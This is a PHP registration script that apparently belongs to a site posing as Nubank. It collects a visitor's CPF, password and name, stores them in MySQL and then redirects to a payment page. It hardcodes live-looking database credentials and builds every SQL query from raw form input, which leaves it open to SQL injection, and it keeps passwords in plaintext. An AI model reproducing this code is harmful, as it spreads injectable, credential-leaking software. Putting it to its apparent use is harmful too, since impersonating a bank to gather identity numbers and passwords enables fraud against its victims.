<?
$hostx = 'mysql.db5.net2.com.br';
$userdb = 'plataformafa2';
$passdb = 'Senhas2023nu';
$bancox = 'plataformafa2';
?>
<link rel="stylesheet" href="estilonu.css">
<!DOCTYPE html>
<html><head>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="shortcut icon" href="imagens/icone.png" />
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />

<?php
$con = mysqli_connect("$hostx", "$userdb", "$passdb", "$bancox");
mysqli_select_db($con, "database");

$valor = "0";

// Remover ponto e substituir vírgula por ponto
$valor = str_replace('.', '', $valor);
$valor = str_replace(',', '.', $valor);

$numeroAleatorio = mt_rand(100000, 999999);

$vcpf = $_POST['cpf'];
$vsenha = $_POST['senha'];
$vnome = $_POST['nome'];
$vsobrenome = $_POST['sobrenome'];
$vinstituicao = 'NU PAGAMENTOS - IP';
$vagencia = '0001';
$vconta = $numeroAleatorio;
$vtipodeconta = 'Conta corrente';
$vsaldo = '0';
$vstatus = 'ON';

// Verificar se o CPF já existe na tabela "usuarios"
$sql_verificar = "SELECT cpf FROM usuarios WHERE cpf = '$vcpf'";
$res_verificar = mysqli_query($con, $sql_verificar);
$num_verificar = mysqli_num_rows($res_verificar);

if ($num_verificar > 0) {
    // CPF já existe na tabela, exiba uma mensagem de erro ou faça o tratamento adequado
echo "<center><span class='icon2' style='font-size: 36px; color: #666;'><br>ERRO!!!<br>CPF<br>" . $vcpf . "<br>já está cadastrado.</span></center>";
    echo "<script>setTimeout(function() { window.history.back(); }, 2000);</script>"; // Voltar para a página anterior após 2 segundos
    exit;
	} else {
    // CPF não existe na tabela, faça a inserção dos dados na tabela "usuarios"
    $sql_usuarios = "INSERT INTO usuarios VALUES (NULL, '$vcpf', '$vsenha', '$vnome', '$vsobrenome', '$vinstituicao', '$vagencia', '$vconta', '$vtipodeconta', '$vsaldo', '$vstatus')";
    $res_usuarios = mysqli_query($con, $sql_usuarios);
    $nun_usuarios = mysqli_affected_rows($con);

    // Inserir dados na tabela "chaves"
    $sql_chaves = "INSERT INTO chaves (chave, cpf, nome, sobrenome, instituicao, agencia, conta, tipoconta, status) 
                  VALUES ('$vcpf', '$vcpf', '$vnome', '$vsobrenome', '$vinstituicao', '$vagencia', '$vconta', '$vtipodeconta', '$vstatus')";
    $res_chaves = mysqli_query($con, $sql_chaves);
    $nun_chaves = mysqli_affected_rows($con);

    // Código para inserção no banco de dados...

    // Redirecionar para a próxima página
    header("Location: pagar.php?cpf=" . urlencode($vcpf));
    exit;
}

mysqli_close($con);
?>
